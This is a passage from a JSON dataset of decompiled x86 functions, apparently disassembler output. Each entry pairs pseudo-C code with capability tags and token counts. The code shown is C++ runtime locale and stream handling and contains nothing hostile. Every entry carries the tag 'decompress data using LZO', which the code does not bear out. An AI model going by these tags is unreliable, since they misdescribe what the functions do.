== 0x516fa4) {\n            puVar3 = fcn.004c2c70(0xa8, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x52c540;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            *(puVar3 + 0x29) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52cc40;\n            puVar2[2] = puVar3;\n            uVar4 = 0x452713;\n            fcn.004bb4b0(0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b658;\n            puVar2[4] = puVar3;\n            fcn.00494940(uVar4 & 0xffffff00, in_ECX, puVar3, noname_3, noname_4, in_stack_ffffffe4, in_stack_ffffffe8, \n                         in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr, 0x516fa4, \n                         in_stack_00000008, in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048);\n        }\n        else if (arg_8h == 0x516f7c) {\n            puVar2 = fcn.004c2c70(0x10, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52cacc;\n            uVar5 = fcn.004ae940();\n            puVar2[2] = uVar5;\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b568;\n        }\n        else if (arg_8h == 0x516fac) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52cc8c;\n            puVar2[2] = in_ECX;\n            if (*0x515a34 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b6f4;\n        }\n        else if (arg_8h == 0x516fbc) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52cd3c;\n            puVar2[2] = in_ECX;\n            if (*0x515a34 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b778;\n        }\n        else if (arg_8h == 0x516fc4) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            iVar1 = *0x515a34;\n            puVar2[1] = 0;\n            *puVar2 = 0x52cd6c;\n            puVar2[2] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b7d8;\n        }\n        else if (arg_8h == 0x516db8) {\n            puVar3 = fcn.004c2c70(0x54, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x52c684;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            puVar3[0xe] = 0;\n            *(puVar3 + 0x52) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bf64;\n            puVar2[2] = puVar3;\n            fcn.0048e350(0, 0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b940;\n            puVar2[4] = puVar3;\n            fcn.00495e10(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x516db4) {\n            puVar3 = fcn.004c2c70(0x54, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x52c674;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            puVar3[0xe] = 0;\n            *(puVar3 + 0x52) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bf30;\n            puVar2[2] = puVar3;\n            uVar5 = 0;\n            fcn.0048df60(0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b8d8;\n            puVar2[4] = puVar3;\n            fcn.00495830(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3, uVar5, noname_3, noname_4, in_stack_ffffffe4, \n                         in_stack_ffffffe8, in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr\n                         , 0x516db4, in_stack_00000008, in_stack_0000000c, in_stack_00000010, in_stack_00000014, \n                         in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, \n                         in_stack_0000002c, in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, \n                         in_stack_00000040, in_stack_00000044);\n        }\n        else {\n            if (arg_8h != 0x516f9c) {\n                uVar5 = fcn.004be210(0x5238d8);\n                fcn.004aea60();\n                fcn.004c2c30(arg_8h);\n                fcn.0043a8e0(uVar5);\n                fcn.004aea60();\n                fcn.004c2c30(arg_8h);\n                fcn.0043a8e0(uVar5);\n                fcn.004aea60();\n                do {\n                    fcn.004c2c30(arg_8h);\n                    fcn.0043a8e0(uVar5);\n                    fcn.004c2c30(arg_8h);\n                    fcn.0043a8e0(uVar5);\n                    fcn.00453450();\n                    fcn.0048df30();\n                } while( true );\n            }\n            puVar2 = fcn.004c2c70(0x14, uVar5);\n            fcn.004bb090(0);\n            iVar1 = *0x515a34;\n            puVar2[4] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b5d8;\n        }\n    }\n    else {\n        puVar2 = *puVar2;\n    }\n    return puVar2;\n}\n",
        "token_count": 5166
    },
    "00452ac0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint * __cdecl fcn.00452ac0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint32_t in_stack_ffffffcc;\n    uint32_t uVar4;\n    uint uVar5;\n    uint noname_3;\n    uint noname_4;\n    uint in_stack_ffffffe4;\n    uint in_stack_ffffffe8;\n    uint in_stack_ffffffec;\n    uint var_bp_ch;\n    \n    noname_4 = 0xfffffffe;\n    noname_3 = 0x5285a8;\n    uVar5 = 0x5285b0;\n    puVar2 = fcn.004c33d0();\n    if (puVar2 == NULL) {\n        if (arg_8h == 0x516f48) {\n            puVar3 = fcn.004c2c70(0x68, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x52c530;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            *(puVar3 + 9) = 0;\n            *(puVar3 + 0x19) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bd00;\n            puVar2[2] = puVar3;\n            uVar4 = 0x452c7f;\n            fcn.004b8520(0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b634;\n            puVar2[4] = puVar3;\n            fcn.00494310(uVar4 & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x516f38) {\n            puVar2 = fcn.004c2c70(0x10, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bc90;\n            uVar5 = fcn.004ae940();\n            puVar2[2] = uVar5;\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b54c;\n        }\n        else if (arg_8h == 0x516f50) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bd48;\n            puVar2[2] = in_ECX;\n            if (*0x515a34 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b6c8;\n        }\n        else if (arg_8h == 0x516f58) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bda0;\n            puVar2[2] = in_ECX;\n            if (*0x515a34 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b760;\n        }\n        else if (arg_8h == 0x516f60) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            iVar1 = *0x515a34;\n            puVar2[1] = 0;\n            *puVar2 = 0x52bdd0;\n            puVar2[2] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b7c0;\n        }\n        else if (arg_8h == 0x516f2c) {\n            puVar3 = fcn.004c2c70(0x44, uVar5);\n            *(puVar3 + 4) = 0;\n            *puVar3 = 0x52c664;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            *(puVar3 + 0x43) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52ba14;\n            puVar2[2] = puVar3;\n            fcn.004af1c0(0, 0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b8a4;\n            puVar2[4] = puVar3;\n            fcn.00494fd0(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x516f28) {\n            puVar3 = fcn.004c2c70(0x44, uVar5);\n            *puVar3 = 0x52c654;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            *(puVar3 + 0x43) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52b9e0;\n            puVar2[2] = puVar3;\n            fcn.004aede0(0, 0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b83c;\n            puVar2[4] = puVar3;\n            fcn.00494af0(in_stack_ffffffcc & 0xffffff00);\n        }\n        else if (arg_8h == 0x516f40) {\n            puVar2 = fcn.004c2c70(0x14, uVar5);\n            fcn.004b82c0(0);\n            iVar1 = *0x515a34;\n            puVar2[4] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b5bc;\n        }\n        else if (arg_8h == 0x516f4c) {\n            puVar3 = fcn.004c2c70(0xa8, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x52c540;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            *(puVar3 + 0x29) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bd24;\n            puVar2[2] = puVar3;\n            uVar4 = 0x4530a3;\n            fcn.004b8870(0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b67c;\n            puVar2[4] = puVar3;\n            fcn.004946b0(uVar4 & 0xffffff00, in_ECX, puVar3, noname_3, noname_4, in_stack_ffffffe4, in_stack_ffffffe8, \n                         in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr, 0x516f4c, \n                         in_stack_00000008, in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050);\n        }\n        else if (arg_8h == 0x516f3c) {\n            puVar2 = fcn.004c2c70(0x10, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bcac;\n            uVar5 = fcn.004ae940();\n            puVar2[2] = uVar5;\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b584;\n        }\n        else if (arg_8h == 0x516f54) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bd74;\n            puVar2[2] = in_ECX;\n            if (*0x515a34 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b71c;\n        }\n        else if (arg_8h == 0x516f5c) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bdb8;\n            puVar2[2] = in_ECX;\n            if (*0x515a34 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b790;\n        }\n        else if (arg_8h == 0x516f64) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            iVar1 = *0x515a34;\n            puVar2[1] = 0;\n            *puVar2 = 0x52bde8;\n            puVar2[2] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b7f0;\n        }\n        else if (arg_8h == 0x516f34) {\n            puVar3 = fcn.004c2c70(0x54, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x52c684;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            puVar3[0xe] = 0;\n            *(puVar3 + 0x52) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52ba7c;\n            puVar2[2] = puVar3;\n            fcn.004af990(0, 0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b974;\n            puVar2[4] = puVar3;\n            fcn.00495a90(in_stack_ffffffcc & 0xffffff00);\n        }\n        else if (arg_8h == 0x516f30) {\n            puVar3 = fcn.004c2c70(0x54, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x52c674;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            puVar3[0xe] = 0;\n            *(puVar3 + 0x52) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52ba48;\n            puVar2[2] = puVar3;\n            uVar5 = 0;\n            fcn.004af5a0(0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b90c;\n            puVar2[4] = puVar3;\n            fcn.004954b0(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3, uVar5, noname_3, noname_4, in_stack_ffffffe4, \n                         in_stack_ffffffe8, in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr\n                         , 0x516f30, in_stack_00000008, in_stack_0000000c, in_stack_00000010, in_stack_00000014, \n                         in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, \n                         in_stack_0000002c, in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, \n                         in_stack_00000040, in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050, \n                         in_stack_00000054, in_stack_00000058);\n        }\n        else {\n            if (arg_8h != 0x516f44) {\n                uVar5 = fcn.004be210(\"cannot create shim for unknown locale::facet\");\n                fcn.004aea60();\n                fcn.004c2c30(arg_8h);\n                fcn.0043a8e0(uVar5);\n                fcn.004aea60();\n                fcn.004c2c30(arg_8h);\n                fcn.0043a8e0(uVar5);\n                fcn.004aea60();\n                do {\n                    fcn.004c2c30(arg_8h);\n                    fcn.0043a8e0(uVar5);\n                    fcn.004c2c30(arg_8h);\n                    fcn.0043a8e0(uVar5);\n                    fcn.00453450();\n                    fcn.004af570();\n                } while( true );\n            }\n            puVar2 = fcn.004c2c70(0x14, uVar5);\n            fcn.004b8450(0);\n            iVar1 = *0x515a34;\n            puVar2[4] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b5f4;\n        }\n    }\n    else {\n        puVar2 = *puVar2;\n    }\n    return puVar2;\n}\n",
        "token_count": 5256
    },
    "00453490": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint32_t __cdecl fcn.00453490(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *in_ECX;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    if (*in_ECX == *arg_8h) {\n        return 1;\n    }\n    piVar1 = *(*in_ECX + 0x10);\n    iVar4 = *piVar1;\n    if (iVar4 != 0) {\n        piVar2 = *(*arg_8h + 0x10);\n        iVar3 = *piVar2;\n        if ((iVar3 != 0) && (iVar4 = sub.msvcrt.dll_strcmp(iVar4, iVar3),  iVar4 == 0)) {\n            if ((piVar1[1] == 0) && (piVar2[1] == 0)) {\n                return 1;\n            }\n            fcn.00451b30(arg_8h);\n            fcn.00451b30(in_ECX);\n            uVar5 = 0;\n            if ((var_44h == var_2ch) && (uVar5 = 1,  var_44h != 0)) {\n                uVar5 = sub.msvcrt.dll_memcmp(var_48h, var_30h, var_44h);\n                uVar5 = uVar5 & 0xffffff00 | uVar5 == 0;\n            }\n            if (var_48h != &var_40h) {\n                uVar5 = uVar5 & 0xff;\n                fcn.004c2c30(var_48h);\n            }\n            if (var_30h == &var_28h) {\n                return uVar5;\n            }\n            fcn.004c2c30(var_30h);\n            return uVar5 & 0xff;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 510
    },
    "00457bd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00457bd0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    char cVar3;\n    bool bVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    uint *puVar13;\n    uint *puVar14;\n    int32_t *piVar15;\n    int32_t *piVar17;\n    uint *puVar18;\n    uint *puVar19;\n    uint *puVar20;\n    int32_t iVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint uStack68;\n    int32_t aiStack64 [5];\n    char cStack41;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    int32_t *piVar16;\n    \n    aiStack64[1] = arg_24h + 0x6c;\n    aiStack64[0] = 0x457be7;\n    var_1ch = fcn.004c0160();\n    aiStack64[0] = 0x457bfe;\n    iVar5 = fcn.00437ed0();\n    iVar5 = -iVar5;\n    *(&stack0xffffffc4 + iVar5) = &fcn.00457bd0::arg_10h;\n    *(&stack0xffffffc0 + iVar5) = 0x457c15;\n    cVar2 = fcn.004502d0();\n    if (cVar2 == '\\0') {\n        *(&stack0xffffffbc + iVar5) = 0x457c3d;\n        cVar2 = fcn.00450370();\n        if (arg_20h != 0) {\n            iVar21 = 0;\n            var_20h = &stack0xffffffd7 + iVar5 & 0xfffffff0;\n            uVar22 = 0;\n            iVar8 = arg_1ch;\n            piVar11 = &stack0xffffffc0 + iVar5;\n            do {\n                while (cVar3 = **(iVar8 + iVar21 * 4),  cVar3 == cVar2) {\ncode_r0x00457c8c:\n                    var_20h[uVar22] = iVar21;\n                    uVar22 = uVar22 + 1;\n                    iVar21 = iVar21 + 1;\n                    piVar15 = piVar11;\n                    if (arg_20h == iVar21) goto code_r0x00457c9d;\n                }\n                iVar5 = *var_1ch;\n                *piVar11 = cVar3;\n                pcVar1 = *(iVar5 + 8);\n                piVar10 = piVar11 + -1;\n                piVar11[-1] = 0x457c70;\n                arg_1ch = iVar8;\n                cVar3 = (*pcVar1)();\n                piVar11 = piVar10 + -4;\n                piVar15 = piVar10 + -4;\n                iVar8 = arg_1ch;\n                if (cVar2 == cVar3) goto code_r0x00457c8c;\n                iVar21 = iVar21 + 1;\n                piVar11 = piVar10 + -4;\n            } while (arg_20h != iVar21);\ncode_r0x00457c9d:\n            piVar11 = var_20h;\n            var_1ch = uVar22;\n            var_20h = NULL;\n            while (1 < var_1ch) {\n                uVar23 = 1;\n                *piVar15 = *(arg_1ch + *piVar11 * 4);\n                piVar15[-1] = 0x457cc8;\n                uVar22 = sub.msvcrt.dll_strlen();\n                do {\n                    *piVar15 = *(arg_1ch + piVar11[uVar23] * 4);\n                    piVar15[-1] = 0x457ce1;\n                    uVar6 = sub.msvcrt.dll_strlen();\n                    if (uVar6 < uVar22) {\n                        uVar22 = uVar6;\n                    }\n                    uVar23 = uVar23 + 1;\n                } while (uVar23 < var_1ch);\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    pcVar1 = *(*arg_8h + 0x28);\n                    piVar16 = piVar15 + -1;\n                    piVar15 = piVar15 + -1;\n                    *piVar16 = 0x457f05;\n                    (*pcVar1)();\n                }\n                var_20h = var_20h + 1;\n                arg_ch = 0xffffffff;\n                if (uVar22 <= var_20h) goto code_r0x00457c1c;\n                cVar2 = '\\x01';\n                if ((arg_8h != NULL) && (cVar2 = '\\0',  arg_8h[3] <= arg_8h[2])) {\n                    pcVar1 = *(*arg_8h + 0x24);\n                    piVar17 = piVar15 + -1;\n                    piVar15 = piVar15 + -1;\n                    *piVar17 = 0x457f0f;\n                    iVar5 = (*pcVar1)();\n                    if (iVar5 == -1) {\n                        arg_8h = NULL;\n                        cVar2 = '\\x01';\n                    }\n                }\n                bVar4 = arg_10h != NULL && arg_14h == -1;\n                var_24h._0_1_ = arg_14h == -1;\n                if ((bVar4) && (var_24h._0_1_ = '\\0',  arg_10h[3] <= arg_10h[2])) {\n                    var_24h = var_24h & 0xffffff00;\n                    pcVar1 = *(*arg_10h + 0x24);\n                    puVar13 = piVar15 + -4;\n                    piVar15 = piVar15 + -4;\n                    *puVar13 = 0x457eba;\n                    iVar5 = (*pcVar1)();\n                    if (iVar5 == -1) {\n                        arg_10h = NULL;\n                        var_24h._0_1_ = bVar4;\n                    }\n                }\n                if (cVar2 == var_24h) goto code_r0x00457c1c;\n                uVar23 = 0;\n                uVar22 = var_1ch;\n                do {\n                    while( true ) {\n                        piVar9 = piVar11 + uVar23;\n                        var_1ch = var_1ch & 0xffffff00 | *(*(arg_1ch + *piVar9 * 4) + var_20h);\n                        uVar6 = arg_ch;\n                        if (arg_8h != NULL) {\n                            if (arg_8h[2] < arg_8h[3]) {\n                                uVar6 = *arg_8h[2];\n                            }\n                            else {\n                                var_24h = piVar9;\n                                pcVar1 = *(*arg_8h + 0x24);\n                                puVar14 = piVar15 + -4;\n                                piVar15 = piVar15 + -4;\n                                *puVar14 = 0x457edd;\n                                uVar6 = (*pcVar1)();\n                                piVar9 = var_24h;\n                                if (uVar6 == 0xffffffff) {\n                                    arg_8h = NULL;\n                                    uVar6 = 0xffffffff;\n                                }\n                            }\n                        }\n                        if (var_1ch != uVar6) break;\n                        uVar23 = uVar23 + 1;\n                        if (uVar22 <= uVar23) goto code_r0x00457da3;\n                    }\n                    uVar22 = uVar22 - 1;\n                    *piVar9 = piVar11[uVar22];\n                } while (uVar23 < 